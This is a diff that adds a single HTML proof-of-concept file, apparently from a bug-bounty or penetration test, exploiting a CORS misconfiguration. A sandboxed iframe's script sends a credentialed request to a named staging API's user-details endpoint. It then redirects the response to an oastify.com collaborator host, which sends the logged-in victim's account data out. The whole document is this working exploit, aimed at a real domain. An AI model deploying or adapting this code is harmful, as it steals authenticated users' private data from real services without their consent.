@@ -1,0 +1,21 @@
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
+    <script>
+        var req = new XMLHttpRequest();
+        req.onload = reqListener;
+        req.open('POST', 'https://staging.anuvadak.in/api/user/fetchUserDetails', true);
+        req.setRequestHeader('Content-Type', 'application/json'); // Set content type to JSON
+        req.withCredentials = true;
+
+        // Prepare the data you want to send in JSON format
+        var postData = JSON.stringify({
+            key: 'value', // Replace with your actual data
+            anotherKey: 'anotherValue'
+        });
+
+        req.send(postData);
+
+        function reqListener() {
+            location = 'https://1kmon1mnysove88p3phfi4xyspygmka9.oastify.com/log?key=' + encodeURIComponent(this.responseText);
+        }
+    </script>
+"></iframe>
